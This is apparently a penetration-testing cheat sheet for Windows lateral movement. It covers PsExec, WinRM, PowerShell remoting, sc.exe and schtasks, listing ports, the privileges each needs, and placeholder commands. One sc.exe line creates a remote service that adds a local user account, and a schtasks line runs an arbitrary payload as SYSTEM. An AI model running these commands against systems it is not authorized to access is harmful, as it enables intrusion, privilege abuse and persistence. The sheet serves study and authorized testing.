# PSEXEC (SYSINTERNALS)

## Ports: 445/TCP 9SMB) 

## Group Memberships: Administrators

## How does it work?

#### 1) Connect to Admin$ share and upload a service binary

#### 2) Connect to the service control manager to create and run a service named psexecsvc and associate the service binary with C:\Windows\psexecsvc.exe

#### 3) Create some named pipes to handle stdin/stdout/stderr 

### Example: 

#### 

    psexec64.exe \\MACHINE_IP -u Administrator -p PASSWORD -i cmd.exe

# WINRM

## Ports: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)

## Group Memberships: Remote Managenemt Users

#### 

    winrs.exe -u:Administrator -p PASSWORD -r:TARGET cmd

# POWERSHELL

## Steps:

#### 1) 

    $username= 'Administrator';

#### 2) 

    $password= 'PASSWORD';

#### 3) 

    $securepassword = ConvertTo-SecureString $password -AsPlaintext -Force;

#### 4) 

    $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword;

#### 

    Enter-PSSession -Computername TARGET -Credential $credential

#### 

    Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

# SC

## Ports: 135/TCP, 49152-65535/TCP (DCE/RPC) 445/TCP (RPC over SMB named pipes) 139/TCP (RPC over SMB named pipes)

## Group Memberships: Administrators

#### 1) 

    sc.exe \\TARGET create SERVICE binPath= "net user USER PASS /add" start= auto

#### 2) 

    sc.exe \\TARGET start SERVICE

#### 3) 

    sc.exe \\TARGET stop SERVICE

#### 4) 

    sc.exe \\TARGET delete SERVICE

# SCHEDULED TASKS REMOTE CREATION

#### 1) 

    schtasks /s TARGET /ru "SYSTEM" /create /tn "task" /tr "COMMAND/PAYLOAD TO EXECUTE" /sc ONCE /sd 01/01/1970 /st 00:00:00

#### 2) 

    schtasks /s TARGET /run /tn ""task"

#### 3) 

    schtasks /s TARGET /tn "task" /DELETE /F

